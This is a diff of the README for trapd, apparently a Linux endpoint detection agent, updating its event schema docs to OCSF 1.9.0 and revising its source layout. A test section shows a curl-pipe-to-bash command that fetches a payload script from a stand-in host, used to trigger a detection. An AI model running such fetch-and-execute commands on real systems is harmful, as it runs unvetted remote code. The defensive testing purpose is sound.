@@ -456,7 +456,15 @@ The state dir is hardened to `0700`; credentials are written atomically at `0600
 
 ## Event schema
 
-Every event — collected, detection, or prevention — shares one envelope:
+Local NDJSON uses OCSF 1.9.0. HTTP delivery starts with the compatible legacy
+format and switches to OCSF only when the gateway advertises
+`x-trapd-event-formats: legacy,ocsf-1.9.0`. Event IDs, precise source timestamps,
+and provenance remain stable across retries and format changes. The durable
+spool retains the internal source envelope below. OCSF maps standard fields and
+preserves original evidence in `unmapped.trapd`; see
+[the mapping and independent validation contract](docs/ocsf-validation.md).
+
+Every collected, detection, or prevention event shares this internal envelope:
 
 ```json
 {
@@ -478,7 +486,7 @@ event actions, command/policy/inventory schemas and backend endpoint contracts i
 maintained in **[`AGENTS.md`](AGENTS.md)** — that file is the authoritative
 backend API reference.
 
-A small sample of what the agent emits:
+A small sample of source events (also preserved in OCSF `unmapped.trapd`):
 
 | Event class  | Action(s)                       | Example data |
 |--------------|---------------------------------|--------------|
@@ -532,7 +540,7 @@ bash -c "curl -s https://example.com/payload.sh | bash"
 tail -f trapd-test/log/events.ndjson | grep '"class":"detection"'
 ```
 
-You'll see a detection event roughly like:
+The OCSF record preserves the following detection evidence in `unmapped.trapd`:
 
 ```json
 {
@@ -679,13 +687,15 @@ missing or invalid replacement signature leaves the installed binary untouched.
 agent/                     Main trapd-agent binary (workspace member)
   src/
     main.rs                Startup, pipeline wiring, mode selection
-    schema/                AgentEvent envelope + all payload schemas
     collectors/linux/      Telemetry collectors (polling + eBPF)
-    detection/             IOC + behavioural + beaconing/DNS/recon engine
+    detection_host.rs      OS evidence, secure baseline storage, metrics adapter
     prevention/            Active response: kill, quarantine, isolate, block
     deception/             Honeytoken profiling, placement, bait validation, registry, OOB canary
     selfprotect/           Watchdog, anti-ptrace, integrity, hardening
     enrollment/ http/ transport/ heartbeat/ config/ inventory/ output/ paths/
+crates/
+  trapd-schema/            Portable typed events, OCSF contract, one sequence source
+  trapd-detection/         Portable detection engine and replay; host runtime interface
 trapd-agent-ebpf/          Kernel-side eBPF programs (separate toolchain)
 xtask/                     `cargo xtask build-ebpf` helper
 deploy/                    install.sh, hardened systemd unit, logrotate
